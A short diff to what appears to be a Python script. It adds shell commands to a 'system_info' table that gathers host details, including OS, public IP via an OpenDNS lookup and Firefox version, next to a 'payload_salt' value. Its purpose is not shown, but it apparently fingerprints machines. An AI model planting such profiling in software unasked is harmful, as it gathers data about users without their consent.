@@ -11,7 +11,10 @@ payload_salt = "FnF4Imd5cQ_z!bF"
 system_info = dict({
 	"node name":"uname -n",
 	"code name":"lsb_release -cs",
-	"language":"echo $LANG"
+	"language":"echo $LANG",
+	"OS":"uname -o",
+	"Public IP":"dig myip.opendns.com @resolver1.opendns.com +short", 
+	"Firefox Version":"firefox -v"
 })
 
 def get_new_salt():
